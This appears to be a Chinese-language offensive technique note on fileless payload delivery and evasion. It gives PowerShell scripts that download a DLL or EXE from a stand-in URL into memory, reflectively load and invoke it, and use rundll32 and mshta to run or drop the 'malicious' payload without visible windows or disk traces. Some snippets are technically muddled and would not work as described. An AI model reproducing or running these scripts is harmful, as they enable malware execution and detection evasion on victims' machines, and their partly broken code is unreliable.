### 利用rundll.32加载，规避
```powershell
# 目标URL（需替换为实际的恶意或测试URL）
$downloadUrl = "http://example.com/payload.dll"

# 目标进程 rundll32.exe
$rundll32 = "$env:SystemRoot\System32\rundll32.exe"

# 在内存中下载文件并加载，不落地磁盘
$wc = New-Object System.Net.WebClient
$bytes = $wc.DownloadData($downloadUrl)  # 直接下载文件数据到内存
$memStream = New-Object System.IO.MemoryStream(,$bytes)  # 将数据存入内存流

# 通过反射加载DLL
$assembly = [System.Reflection.Assembly]::Load($memStream)

# 查找并执行恶意DLL的导出函数
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, @())

# 通过 rundll32.exe 执行
Start-Process -FilePath $rundll32 -ArgumentList "C:\Windows\System32\shell32.dll,Control_RunDLL" -NoNewWindow
```
在内存中操作时都不会有窗口，虽然使用了外部进程rundll.32会有窗口，但是脚本加入了-nonewwindows命令就没有了窗口
同时，rundll.32属于外部程序，执行时要利用start-process命令先创建rundll的进程在让rundll执行恶意文件。
如果，你的dll或者exe文件都落地内存中，此时执行dll已经不能使用rundll.32了，使用该函数需要dll的实体路径，落地内存没有实体路径，那上述代码中写到`$entryPoint.Invoke($null, @())`
这一句即可，当然你可以将dll文件落地到temp临时的磁盘文件路径中，在利用rundll加载。

### 利用mshta下载，加载，规避
#### mshta加载dll
下面该段代码为利用mshta下载，加载，执行dll文件不是exe文件
```powershell
# 指定下载文件的URL
$url = "http://example.com/malicious.dll"

# 下载文件到内存中
$wc = New-Object System.Net.WebClient
$fileData = $wc.DownloadData($url)

# 将文件数据加载到内存流
$memStream = New-Object System.IO.MemoryStream(,$fileData)

# 使用反射加载DLL
$assembly = [System.Reflection.Assembly]::Load($memStream.ToArray())

# 获取 DLL 中的入口点
$entryPoint = $assembly.EntryPoint

# 执行入口点中的方法（即恶意代码）
$entryPoint.Invoke($null, @())

# 使用 mshta 执行内存中的脚本
mshta "javascript:eval('var blob = new Blob([\"' + [System.Convert]::ToBase64String($fileData) + '\"]);var url = URL.createObjectURL(blob);window.location.href=url;')"
```

#### mshta加载exe文件
下面该段代码是利用mshta文件加载exe文件
```powershell
# 指定恶意 EXE 文件的 URL
$url = "http://example.com/malicious.exe"

# 下载 EXE 文件到内存中
$wc = New-Object System.Net.WebClient
$exeData = $wc.DownloadData($url)

# 将 EXE 数据编码为 Base64
$base64Exe = [Convert]::ToBase64String($exeData)

# 使用 mshta 执行 Base64 编码的 EXE 文件（通过 JavaScript 解码并执行）
mshta "javascript:
    var encodedData = '$base64Exe';
    var byteArray = new Uint8Array(atob(encodedData).split('').map(function(c) { return c.charCodeAt(0) }));
    var blob = new Blob([byteArray]);
    var url = URL.createObjectURL(blob);
    var link = document.createElement('a');
    link.href = url;
    link.download = 'malicious.exe';
    link.click();"
```
